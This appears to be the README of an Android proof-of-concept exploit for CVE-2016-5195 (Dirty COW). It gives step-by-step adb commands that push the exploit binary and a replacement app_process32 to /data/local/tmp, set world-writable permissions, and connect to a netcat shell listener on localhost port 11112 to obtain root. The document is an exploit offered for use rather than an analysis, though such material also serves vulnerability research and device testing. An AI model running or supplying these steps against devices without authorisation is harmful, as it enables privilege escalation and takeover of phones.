# limited_shell_root

limited_shell_root CVE-2016-5195 (dirty cow/dirtycow/dirtyc0w) proof of concept for Android

How to use.

Once compiled

adb push dirtycow /data/local/tmp/dirtycow

adb push recowvery-app_process32 /data/local/tmp/recowvery-app_process32

adb shell chmod 0777 /data/local/tmp/*

adb shell

toybox nc localhost 11112

Shell is now active type ls
